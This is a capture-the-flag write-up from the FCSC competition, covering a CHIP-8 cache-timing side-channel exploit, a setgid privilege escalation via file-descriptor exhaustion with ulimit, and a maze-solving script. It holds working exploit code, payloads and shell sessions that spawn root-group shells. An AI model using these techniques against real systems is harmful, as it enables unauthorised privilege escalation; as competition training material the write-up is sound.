# FCSC Write ups

*By Kkameleon*

## BattleChip (or how to sink several times before turning into a torpedo) (time : 8 hours)

My first impression at the beginning of the FCSC was that this challenge on a complete new chip with a lot of documentation wasn't going to be profitable.
I change my mind when doing the Chips and Fish, I found the concept of attacking such new infrastructure very fun so I took a look at the bigger challenge.

The way to flag striked me while reading the documentation "Pour palier ce problème de performance, le constructeur a mis au point un système de cache partagé". I took a look at the code and saw that the number of operation was return by the encrypt routine. From this point I was sure I had to exploit the number of operation.

Nice, fast start, but...

Happy to have an idea this fast, I started coding thinking there was a temporary key and a persistent key because of this "Xor a buffer of size 10 stores at I with a temporary key. The secret key is already defined.". I end up making a statistical attack on an unexisting persistent key :

Brievly, the concept is I was sending xxxxxxxxxxxx to verification and then to encryption and the caracters x who were returning a lower number of instructions were more susceptible those of the unexisting persistent key. 


```python
#!/usr/bin/python
from pwn import *
import time
import binascii

logs = b""
bytess = {}
for i in range(256):
    bytess[i]=0
for _ in range(1000):
    for j in range(256):
        r = remote("challenges1.france-cybersecurity-challenge.fr", 7004,level='error')
        payload = ""
        payload += "00E1"
    
        hexj = ""
        if j<16:
            hexj+="0"
        hexj+=hex(j)[2:]
        
        for i in range(10):
            payload += "6{}{}".format(i,hexj)
        payload += "F955" # Stores our values at I
        
        payload += "0001" # Ask for encryption
        
        for i in range(10):
            payload += "6{}{}".format(i,hexj)
        payload += "F955" # Stores our values at I
        
        payload += "0000" # Get number of operation
        
        payload += "AEA0" # Go to the stack
        payload += "FF55" # Get all values
        payload += "AEAF" # Place at the end of our value
        
        payload += "6300" # x
        payload += "6400" # y
        payload += "D348" # display
        
#        payload += "FFFF" # end
        try : 
            #print("\nJ",hexj)
            #print(payload) 
            r.sendline(payload)
            
            data = r.recvuntil(b"Traceback")
            #logs += data
            binary = data.split(b"\n")[33].replace(b"\xe2\x96\x88",b"1").replace(b" ",b"0")[7:15]
            intt = int(binary,2)
            if intt!=122:

                if hexj[0]=="0":
                    print(int("0x"+hexj[1],16))
                    bytess[int("0x"+hexj[1],16)]+=1
                else :
                    print(int("0x"+hexj,16))
                    bytess[int("0x"+hexj,16)]+=1
        except Exception as e:
            print(e)
            #print("pb")
            j-=1
            pass
    print(bytess)

#with open("log","wb") as f :
#    f.write(logs)
```

It was really slow, and didn't seem to be the way so I took another look at the code and I realised I was very very wrong :).

Obviously there wasn't any persistent key, so I had to make a single request to get the flag, I was like "Oh damn", I had a proper understanding of the challenge. But ...

My exploit is based on :
- The fact that if a xor(a,b) have been made in the last 16 xors (size of the LRU cache), then if there is a new xor(a,b) it takes one operation less
- The fact that we know indeed the number of operation made when encrypting as it is returned in VF register
- And last but not least that our input is xor by the left in encrypt and by the right in verify (which is crucial, because xor(a,b) is not the same thing as xor(b,a) for the LRU cache)
- The fact that there is no 0 (arbitrary chosen value) in the key (which is very probable) so the values I am not testing are not interfering with the result

For the second time in the challenge, I started to code without thinking twice to see if there was a better way. I was eager to solve it. My idea was to find couple (Key[x],a) = (b,Key[y]) so I could put key[x]=b and key[y]=b. And I didn't realise at first I could juste look for (Key[x],a) = (a,Key[x]) and simply have key[x]=a.


```python
from pwn import *

def xor(x,y):
    return "8{}{}3".format(x,y)

def clearCache(): 
    return "00E1"

def displayFlag(): # Sachant VC = 0xa
    payload = "FC1E" # I + 10
    payload += "6400"
    payload += "D448"
    payload += "640A"
    payload += "D448"
    return payload

def end():
    return "FFFF"

# AEA0 is the payload place
def prepareI(reg_valeur,reg_place):
    payload = "AEA0"
    payload += s(V1,1)
    payload += s(V0,0)
    for _ in range(10) :
        payload += "F055"
        payload += "F11E"
    payload += "AEA0"
    payload += "F{}1E".format(hex(reg_place)[2])
    payload += move(V0,reg_valeur)
    payload += "F055"
    payload += "AEA0"
    return payload

def encrypt(reg_valeur,reg_place):
    payload = prepareI(reg_valeur,reg_place)
    payload += "0000"
    return payload


def verify(reg_valeur,reg_place):
    payload = prepareI(reg_valeur,reg_place)
    payload += "0001"
    return payload

def verifyKey():
    payload = "AFA0"
    payload += "0001"
    return payload

# AFA0 is the key place
def setK(reg_dest,reg_source):
    payload = "AFA0"
    payload += "F{}1E".format(hex(reg_dest)[2])
    payload += move(V0,reg_source)
    payload += "F055"
    payload += "AEA0"
    return payload

def isNotFound(reg_dest):
    payload = "AFA0"
    payload += s(V2,0)
    payload += "F{}1E".format(hex(reg_dest)[2])
    payload += "F065"
    payload += "AEA0"
    return cmp(V0,V2)



def hexr(valeur):
    p = ""
    if valeur == 0:
        p="00"
    elif valeur < 16:
        p+="0"
        p+=hex(valeur)[2]
    else :
        p=hex(valeur)[2:]
    return p

def s(registre,valeur):
    return "6{}{}".format(hex(registre)[2],hexr(valeur))

def add(registre,valeur):
    return "7{}{}".format(hex(registre)[2],hexr(valeur))

def move(dest,source):
    return "8{}{}0".format(hex(dest)[2],hex(source)[2])

def cmp(i,j):
    return "5{}{}0".format(hex(i)[2],hex(j)[2])

def sub(i,j):
    return "8{}{}5".format(hex(i)[2],hex(j)[2])

def jmpRound():
    return "1RRR"
def jmpBegin():
    return "1BBB"
def jmpContinue():
    return "1CCC"
def jmpThere():
    return "1TTT"
def jmpEpilogue():
    return "1EEE"

# We suppose 00 is not in the secret key, which must happens frequently

#5 2 3 4
#2 0 0 0 

#0 0 0 0
#1 0 0 0
#2 0 0 0
#3 0 0 0
#4 0 0 0
#5 0 0 0
#5 2 3 4

# PSEUDO CODE
#VE = encrypt(.........)
#VE -= 4
#VC = 0xa
#VD = 0xff
#for V8 in range(10):    <--- debut ici
#    if not already_found[V8] :
#    V9 = 0 # 256
#    VA = 0 #10
#    VB = 0 # 256
#    clearCache()    <-- Nouveau tour
#    verify(...V9..... ) # en place V8
#    encrypt(...VB...) # en place VA
#    if VF == VE : # boum on trouve un couple
#        key[V8]=VB
#        key[VA]=V9
#        V8+=1
#        goto debut
#    else :
#        VB+=1
#        if VB == VD :
#            VB=0
#            VA +=1
#            if VA == VC :
#                VA = 0
#                V9+=1
#        goto nouveauTour
#                
#verify(key)
#display_flag()

V0=0x0;V1=0x1;V2=0x2;V3=0x3;V4=0x4;V5=0x5;V6=0x6;V7=0x7;V8=0x8;V9=0x9;VA=0xa;VB=0xb;VC=0xc;VD=0xd;VE=0xe;VF=0xf

addr = 0x200

payload = ""
payload += clearCache()
payload += s(V0,0)


payload += encrypt(V0,V0)


payload += move(VE,VF)
payload += s(V5,1)
payload += sub(VE,V5)

payload += s(V6,0)
payload += s(V7,0)
payload += s(VC,0xa)
payload += s(VD,0xff)
payload += s(V8,0)

BBB = hex(addr+len(payload)//2)
print("Begin",BBB)
payload += s(V9,0) #<-- Begin 
payload += s(VA,0)
payload += s(VB,0)

payload += isNotFound(V8)         # if K[V8] == 00
payload += jmpThere()             # if not  we jump to There
payload += jmpRound()             # else we increase V8 and 

TTT = hex(addr+len(payload)//2)
print("There",TTT)
payload += add(V8,1)    #<-- There
payload += cmp(V8,VC)
payload += jmpBegin()
payload += jmpEpilogue()

RRR = hex(addr+len(payload)//2)
print("Round",RRR)
payload += clearCache() #<-- Round

payload += verify(V9,V8)         # We fill the cache
payload += encrypt(VB,VA)        # We get information in VF


payload += cmp(VF,VE)            # Did we found a couple ?
payload += jmpContinue()        # if not got to continue

payload += setK(V8,VB)           # Else set couple
payload += setK(VA,V9)
payload += add(V8,1)
payload += jmpBegin()

CCC = hex(addr+len(payload)//2)
print("Continue",CCC)
payload += add(VB,1)  #<-- Continue
payload += cmp(VB,VD) # Is VB at the end ?
payload += jmpRound() # If not go make another round
payload += s(VB,0)    # Else VB = 0 ans Va+=1
payload += add(VA,1)
payload += cmp(VA,VC) # Is VA at the end ?
payload += jmpRound() # If not go make another round
payload += s(VA,0)    # Else : VA = 0 and V9+=1
payload += add(V9,1)
payload += jmpRound() # V9 can't reach the end

EEE = hex(addr+len(payload)//2)
print("Epilogue",EEE)
payload += verifyKey()  #<-- epilogue
payload += displayFlag()
payload += end()


print(len(payload))
print("\n")
print(payload)
print("\n")
payload = payload.replace("BBB",BBB[2:])
payload = payload.replace("CCC",CCC[2:])
payload = payload.replace("EEE",EEE[2:])
payload = payload.replace("RRR",RRR[2:])
payload = payload.replace("TTT",TTT[2:])
print("\n")
print("Final payload",payload)
print("Final length",len(payload))


for i in range(0,len(payload),4):
    print(payload[i:i+4])

```

I made this code and I start debugging it with extensive print locally. It was beginning to look like an exploit that could work. I realised I had a little problem with the size of the cache, it was 16 so I could not have my couple found if they were too far one from another, this is juste a problem of what do I increase first and could be solved by modifying the incrementation in the code above. While realising that and looking at my extensive print with secret key "123456789a", a (49,49)-(49,0) pair caught my eye. My code was running in circle when it find the first couple. I was like "Wait, if I have (49,49)-(49-49) I also have a instruction less :)". From there, as I had already done the hardwork, I wrote in five minutes time a new code and it worked perfectly at first shot, a perfect torpedo.(Sure it can be optimised)

For each position (1 to 10) I do verify(0 0 0 X 0 0 0 0 0 0) and VF = encrypt(0 0 0 X 0 0 0 0 0 0 0), if VF is lower than encrypt(0 0 0 0 0 0 0 0 0 0) then I have secret_key[position] = X



```python
from pwn import *

def xor(x,y):
    return "8{}{}3".format(x,y)

def clearCache():
    return "00E1"

def displayFlag(): # Sachant VC = 0xa
    payload = "FC1E" # I + 10
    payload += "6400"
    payload += "D448"
    payload += "6508" # I + 8 FLAG is 16 caracters long
    payload += "F51E"
    payload += "640A"
    payload += "D448"
    return payload

def end():
    return "FFFF"

# AEA0 is the payload place
def prepareI(reg_valeur,reg_place):
    payload = "AEA0"
    payload += s(V1,1)
    payload += s(V0,0)
    for _ in range(10) : # I didn't want a goto in here, so lot of zeroing instructions (0 0 0 0 0 0 0 0 0 0)
        payload += "F055"
        payload += "F11E"
    payload += "AEA0"
    payload += "F{}1E".format(hex(reg_place)[2]) # Jumping to the righ place to put our X (0 0 0 0 X 0 0 0 0 0)
    payload += move(V0,reg_valeur)
    payload += "F055"
    payload += "AEA0"
    return payload

def encrypt(reg_valeur,reg_place):
    payload = prepareI(reg_valeur,reg_place)
    payload += "0000"
    return payload


def verify(reg_valeur,reg_place):
    payload = prepareI(reg_valeur,reg_place)
    payload += "0001"
    return payload

def verifyKey():
    payload = "AFA0"
    payload += "0001"
    return payload

# AFA0 is the key place
def setK(reg_dest,reg_source):
    payload = "AFA0"
    payload += "F{}1E".format(hex(reg_dest)[2])
    payload += move(V0,reg_source)
    payload += "F055"
    payload += "AEA0"
    return payload

def hexr(valeur):
    p = ""
    if valeur == 0:
        p="00"
    elif valeur < 16:
        p+="0"
        p+=hex(valeur)[2]
    else :
        p=hex(valeur)[2:]
    return p

def s(registre,valeur):
    return "6{}{}".format(hex(registre)[2],hexr(valeur))

def add(registre,valeur):
    return "7{}{}".format(hex(registre)[2],hexr(valeur))

def move(dest,source):
    return "8{}{}0".format(hex(dest)[2],hex(source)[2])

def cmp(i,j):
    return "5{}{}0".format(hex(i)[2],hex(j)[2])

def sub(i,j):
    return "8{}{}5".format(hex(i)[2],hex(j)[2])

def jmpRound():
    return "1RRR"
def jmpBegin():
    return "1BBB"
def jmpContinue():
    return "1CCC"
def jmpThere():
    return "1TTT"
def jmpEpilogue():
    return "1EEE"

# We still suppose 00 is not in the secret key, which must happens frequently

#VE = encrypt(.........)
#VE -=1
#VC = 0xa
#VD = 0xff
#for V8 in range(10):    <--- Beginning
#    V9 = 0 # 256
#    clearCache()    <-- New Round
#    verify(...V9..... ) # in place V8
#    encrypt(..V9...)    # in place V8
#    if VF == VE : # boum we have V9 = key[VA]
#        key[V8]=V9
#        V8+=1
#        if V8 == VC :
#           goto happyEnding
#        else :
#           goto Beginning
#    else :
#        V9+=1
#        jmpRound()
#
#verify(key) <-- Happy ending
#display_flag()


V0=0x0;V1=0x1;V2=0x2;V3=0x3;V4=0x4;V5=0x5;V6=0x6;V7=0x7;V8=0x8;V9=0x9;VA=0xa;VB=0xb;VC=0xc;VD=0xd;VE=0xe;VF=0xf

addr = 0x200  #<-- Place of the rom

payload = ""
payload += clearCache()
payload += s(V0,0)

payload += encrypt(V0,V0)


payload += move(VE,VF)
payload += s(V5,1)
payload += sub(VE,V5)


payload += s(V6,0)
payload += s(V7,0)
payload += s(VC,0xa)
payload += s(VD,0xff)
payload += s(V8,0)

BBB = hex(addr+len(payload)//2)
print("Begin",BBB)
payload += s(V9,0) #<-- Begin 

RRR = hex(addr+len(payload)//2)
print("Round",RRR)
payload += clearCache() #<-- Round

payload += verify(V9,V8)         # We fill the cache
payload += encrypt(V9,V8)        # We get information in VF

payload += cmp(VF,VE)            # Did we found a value ?
payload += jmpContinue()        # if not got to continue

payload += setK(V8,V9)           # Else set value
payload += add(V8,1)             

payload += cmp(V8,VC)
payload += jmpBegin()
payload += jmpEpilogue()

CCC = hex(addr+len(payload)//2)
print("Continue",CCC)
payload += add(V9,1)  #<-- Continue
payload += jmpRound() # V9 can't reach the end
   
EEE = hex(addr+len(payload)//2)
print("Epilogue",EEE)
payload += verifyKey()  #<-- epilogue
payload += displayFlag()
payload += end()


print(len(payload)) # Check consistency with final length
print("\n")
print(payload)
print("\n")
payload = payload.replace("BBB",BBB[2:])  # Replace goto adresses
payload = payload.replace("CCC",CCC[2:])
payload = payload.replace("EEE",EEE[2:])
payload = payload.replace("RRR",RRR[2:])
print("\n")
print("Final payload",payload)
print("Final length",len(payload))


#for i in range(0,len(payload),4):
#    print(payload[i:i+4])
```

Begin 0x24e
Round 0x250
Continue 0x2dc
Epilogue 0x2e0
488


00E16000AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F01E8000F055AEA000008ef065018e55660067006c0a6dff6800690000E1AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F81E8090F055AEA00001AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F81E8090F055AEA000005fe01CCCAFA0F81E8090F055AEA0780158c01BBB1EEE79011RRRAFA00001FC1E6400D4486508F51E640AD448FFFF




Final payload 00E16000AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F01E8000F055AEA000008ef065018e55660067006c0a6dff6800690000E1AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F81E8090F055AEA00001AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F81E8090F055AEA000005fe012dcAFA0F81E8090F055AEA0780158c0124e12e079011250AFA00001FC1E6400D4486508F51E640AD448FFFF
Final length 488



```python
kkameleon@ecaille ~ % nc challenges1.france-cybersecurity-challenge.fr 7004
hex encoded rom: 
00E16000AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F01E8000F055AEA000008ef065018e55660067006c0a6dff6800690000E1AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F81E8090F055AEA00001AEA061016000F055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EF055F11EAEA0F81E8090F055AEA000005fe012dcAFA0F81E8090F055AEA0780158c0124e12e079011250AFA00001FC1E6400D4486508F51E640AD448FFFF
 █   █ █                                                        
█  █                                                            
 ██  █                                                          
████ █ █                                                        
█ ███                                                           
 █  █                                                           
 ██ ███                                                         
█  █   █                                                        
                                                                
                                                                
          █   █ ██                                              
           █  ████                                              
           █     █                                              
             █   █                                              
                                                                
           ██  █ █                                              
          ██  ███                                               
          █  █  ██                                              
                                                                
                     
```

It gives a beautiful image with two block 8x8 of pixels, one can read the caracters of the flag line by line in binary, white pixel is 1 and black one is 0 in terminal (here red and black are 1).

I found all the instructions I used on https://en.wikipedia.org/wiki/CHIP-8 which was very clear.
I though to look for chip-8 compiler but I did not found anything that could convince me.

Retrospectively, I lost of time doing random nonsense at the beginning of the challenge. In the end, I handle nicely the automatic replacement of adresses and the python -> chip8 part. I like to start to code a parser or other small piece of code before finishing to think so I can be more familiar with variables and see things from another angle. However here, it played against me, I realised two times that there was a better way long after developping my exploit.
The challenge was superfun, I really thank the FCSC organisators for it.

## Privesc Me (2) - "ALED" - Your randomness checker (or how to see a beautiful unexploitable race condition) (time 4 hours)

Here is a privesc challenge. I like to privesc, I have been training a lot on privesc recently because it is an unavoidable part of the road to fully compromise a clusters of servers.

Let's remind us of the code of the challenge :


```python
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#define BUF_SIZE 128

int main(int argc, char const *argv[]) {

    if(argc != 3){
        printf("Usage : %s <key file> <binary to execute>", argv[0]); # Ok usage
    }
    setresgid(getegid(), getegid(), getegid()); # Now we have permissions
    
    int fd;
    unsigned char randomness[BUF_SIZE];
    unsigned char your_randomness[BUF_SIZE];
    memset(randomness, 0, BUF_SIZE);              # same size, same value, at first
    memset(your_randomness, 0, BUF_SIZE;          # the two buffers are equals

    int fd_key = open(argv[1], O_RDONLY, 0400);   # We read an arbitraty file and the file descriptor is never closed !
    read(fd_key, your_randomness, BUF_SIZE);

	fd = open("/dev/urandom", O_RDONLY, 0400);    # We read /dev/urandom, we have no control over it
    int nb_bytes = read(fd, randomness, BUF_SIZE);
    for (int i = 0; i < nb_bytes; i++) {
        randomness[i] = (randomness[i] + 0x20) % 0x7F; # Very weird computation, it lowers the randomness, might be important
    }
    
    for(int i = 0; i < BUF_SIZE; i++){
        if(randomness[i] != your_randomness[i]) {  # Check function
            puts("Meh, you failed");
            return EXIT_FAILURE;
        }
    }
    close(fd);                                      # fd closed
    puts("Ok, well done");                          # Goal
    char* arg[2] = {argv[2], NULL};                 
    execve(argv[2], arg, NULL);
    return 0;
}

```

One can see several things :
- Obviously if we manage to reach to "Well Done", we can execute a /bin/sh or a custom paylaod
- The file descriptor fd_key is not closed
- The two buffers have the same value if nothing is put in them
- There is a very weird computation which reduce the entropy of /dev/urandom by 2

Additionaly the file was statically linked. At first I thought it was there to avoid shared librairies exploit.

I had several ideas. I didn't see at first that the close(fd_key) was missing and i though about it later while doing this write up, I didn't have at the time yet to see if I could do something about it.

My first idea was to somehow guess /dev/urandom because thanks to a low entropy problem. We see that the %0x7f is already cutting the entropy os randomness by 50%. I checked /dev/random to see if it was giving me something. Indeed /dev/urandom is non blocking when /dev/random is, it means that is the system does not have enough entropy then /dev/random will give us a limited amount of bytes when /dev/urandom will give us poorly random byte (and so maybe guessable bytes). /dev/random was working fine, it was not the way.

My second idea was to link my key file to /dev/urandom, but I read that /dev/urandom is made so it can't be read from two different place at the same time. It was not the way either.

My third idea was about the reading function. When a programm receive a sigint while reading a file, it stops, and does not continue to read after a sigcont. Soooooo, the aim was to send a sigint when the program had read one byte of /dev/urandom and then we had 1/128 chance to have the two buffer matching.
The problem here is not the 1/128 but sending a sigint after a one byte read, which is very unlikely.
I still decided to try it.

Here is proof.c


```python
//proof.c

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#define BUF_SIZE (1UL<<28UL) // This is a lot of reading


#include <signal.h>


void intHandler(int dummy) {
  printf("signal");
}

int main(int argc, char *argv[]) {
   setbuf(stdout, NULL);
    int fd;
    unsigned char* randomness = malloc(BUF_SIZE);
    if (randomness == NULL)
      return 1;

    memset(randomness, 0, BUF_SIZE);

	fd = open(argv[1], O_RDONLY, 0400);
    printf("want to read %ld bytes\n", BUF_SIZE);
    int nb_bytes = read(fd, randomness, BUF_SIZE);
    printf("actually read %d bytes\n", nb_bytes);

    if (nb_bytes < BUF_SIZE) {
      printf("muahah... read() terminated early :)\n");
      puts("Ok, well done");
      
      printf(argv[2]);
      char* arg[2] = {argv[2], NULL};
      printf("%s\n",argv[2]);
      execve(argv[2], arg, NULL);
    }

    close(fd);
    return 0;
}

```


```python
//runner.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h> 
#include <stdlib.h>
#include <errno.h>  
#include <sys/wait.h>

  
int main(int argc, char* argv[]){
     setbuf(stdout, NULL);

   pid_t  pid;
   int ret = 1;
   int status;
   pid = fork();
  
   if (pid == -1){
      printf("can't fork, error occured\n");
      exit(EXIT_FAILURE);
   }
   else if (pid == 0){
      char * argv_list[] = {"/dev/zero","./bin/sh",NULL};
  
   
      execv("./proof",argv_list);
      exit(0);
   }
   else{
      printf("Parent Of parent process, pid = %u\n",getppid());
      printf("parent process, pid = %u\n",getpid()); 
      printf("child: %u\n",pid); 
      printf("sleeping\n");
      printf("%d\n",atoi(argv[1]));
      usleep(atoi(argv[1])*100);

      printf("sending SIGSTOP\n");
      kill(pid, SIGSTOP);
      printf("sending SIGCONT\n");
      kill(pid, SIGCONT);
  
        if (waitpid(pid, &status, 0) > 0) {
              
            if (WIFEXITED(status) && !WEXITSTATUS(status)) 
              printf("program execution successful\n");
              
            else if (WIFEXITED(status) && WEXITSTATUS(status)) {
                if (WEXITSTATUS(status) == 127) {
  
                    printf("execv failed\n");
                }
                else 
                    printf("program terminated normally,"
                       " but returned a non-zero status\n");                
            }
            else 
               printf("program didn't terminate normally\n");            
        } 
        else {
           printf("waitpid() failed\n");
        }
      exit(0);
   }
   return 0;
}

```


```python
kkameleon@ecaille ~/draft/fcsc/misc % ./runnner 3
Parent Of parent process, pid = 385054
parent process, pid = 387321
child: 387322
sleeping
3
sending SIGSTOP
want to read 268435456 bytes
actually read 217548 bytes
sending SIGCONT
muahah... read() terminated early :)
Ok, well done
program didn't terminate normally

```

It was working relatively fine with a huge amount of bytes, but I didn't manage to decrease enough the number of bytes read so I gave up this way of doing things.
In my researches to write these code, I found other interesting things I wasn't aware of. It appeared that I could limit the size of the stack and of many others things like the number of open file descriptors for my session by using ulimit in bash et setrlimit in c.

I start messing around with the programm, and by doing ulimit -n 0, the programm stage1 was display "Ok Well Done"


```python
challenger@privescme:~$ ulimit -Sn 0
challenger@privescme:~$ cd stage1
challenger@privescme:~/stage1$ ./stage1 /dev/z /bin/sh
-bash: start_pipeline: pgrp pipe: Too many open files
Ok, well done
/bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24
challenger@privescme:~/stage1$ 
```

Obviously I had a problem due to my ulimit -Sn 0 which decrease the soft limit of openned file descriptors. :)

So the next step was to undo what I had done with ulimit -n 0 and we could not chmod +x a sh file on the server, I wrote another little c programm (I am not a c monster at all, I survive but I rather do python or Java).


```python
challenger@privescme:/tmp/kkam$ cat a.c
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <stdio.h>

int main(void)
{
        struct rlimit lim = {1024, 1024};        
        setrlimit(RLIMIT_NOFILE,&lim);
        system("/bin/bash");
        return 0;
}
```


```python
challenger@privescme:/tmp/kkam$ gcc -static -o a a.c
challenger@privescme:/tmp/kkam$ ulimit -Sn 0
challenger@privescme:/tmp/kkam$ ~/stage1/stage1 /dev/unexisting /tmp/kkam/a
-bash: start_pipeline: pgrp pipe: Too many open files
Ok, well done
challenger@privescme:/tmp/kkam$ cat ~/stage1/flag.txt 
FCSC{****}
```

Restrospectively, we understand that if the file was not statically linked it may not have been possible : it opens librairies, load them and close them, and use these free file descriptors to read /dev/urandom, so we are screwed because either we can't launch the program or we don't win.
I was really happy to learn the existence of this limitations as it can be useful in more than one case :). I spend too much time on my race condition but it made me do c and research enough to find an another way :).
Now, maybe there is something we can do my doing ./stage1 flag.txt /hop. I will look for it.

All the challenges in the competition were great, thank you !!!
Next year I will be back with real poney-ing skills !

## Ventriglisse 

A solution based on networkx :).

```python
from pwn import *
import base64
from PIL import Image
from io import BytesIO
import networkx
import numpy as np



def solve(im):
    print(im.size)
    nx = im.size[0]//64-2 
    ny = im.size[1]//64 -3
    print(nx,ny)
    X_offset = 64
    Y_offset = 2*64
    px = 2 * nx + 1
    py = 2 * ny + 1
    print(px,py)
    graph = networkx.DiGraph()
    ma = np.zeros((py+4,px),dtype=int)
    for x in range(px):
        for y in range(py):

            mypx = im.getpixel((32*x+X_offset, 32*y+Y_offset))
            #print(mypx)
            ma[y+2][x]=int(min(mypx)/255)
    
    for y in range(py+2):
        ma[y][-1]=0
    for x in range(px):
        ma[-1][x]=0
        ma[-2][x]=0
        ma[-3][x]=0
    
    startnode = None
    endnode = None
    y=1
    for x in range(nx+1):
        y = 2
        if im.getpixel((64*x+32,64*y-20))==(229,20,0):
            endnode= x-1
        y = ny+3
        if im.getpixel((64*x+32,64*y-50))==(229,20,0):
            startnode = x-1
    print(startnode)
    print(endnode)
    ma[1][2*(endnode)+1]=1
    ma[2][2*(endnode)+1]=1
    ma[-2][2*(startnode)+1]=1
    ma[-3][2*(startnode)+1]=1
    print(len(ma)) 
    for a in ma :
        print(list(a))
    
    for x in range(1,px,2):
        for y in range(1,py+4,2):
            if ma[y][x]==1:
                for dx, dy in ((-1,0),(1,0),(0,-1),(0,1)):
                    ox = x+dx
                    oy = y+dy
                    i = 1
                    p = False
                    while  ox<px and oy <(py+4) and ma[oy][ox] == 1 : 
                        ox = x + (2*i+1) * dx
                        oy = y + (2*i+1) * dy
                        i += 1
                        p = True
                    ox-=dx
                    oy-=dy
                    if p :
                        #print(((x-1)//2,(y-1)//2), ((ox-1)//2,(oy-1)//2))
                        graph.add_edge(((x-1)//2,(y-1)//2), ((ox-1)//2,(oy-1)//2))
                        #graph.add_edge(((ox-1)//2,(oy-1)//2), ((x-1)//2,(y-1)//2))
    


    path = networkx.shortest_path(graph,(startnode,(len(ma)-3)//2),(endnode,0))
    result = ''
    for i in range(len(path)-1):
        #print(path[i])
        myx, myy  = path[i]
        nxx, nxy  = path[i+1]
        if myx < nxx:
            result += 'E'
        if myx > nxx:
            result += 'O'
        if myy < nxy:
            result += 'S'
        if myy > nxy:
            result += 'N'
    print(result)
    return result + ''

r = remote('challenges1.france-cybersecurity-challenge.fr',7002, level='info')
rec = r.recvuntil('END MAZE ---')
print(rec[:200])
maze = rec.decode().split('BEGIN MAZE ---')[1].split('\n')
b64data = ''.join(maze[1:-1])
im = Image.open(BytesIO(base64.b64decode(b64data)))
print(solve(im))

r.sendline('')
mazeid = 0
while True:
    try:
        rec = ''
        rec = r.recvuntil('END MAZE ---')
        print(rec[:200])
        maze = rec.decode().split('BEGIN MAZE ---')[1].split('\n')
        b64data = ''.join(maze[1:-1])
        im = Image.open(BytesIO(base64.b64decode(b64data)))
        im.save('maze.png')
        r.sendline(solve(im))
    except:
        print(r.recvrepeat(1.0))
        break
```


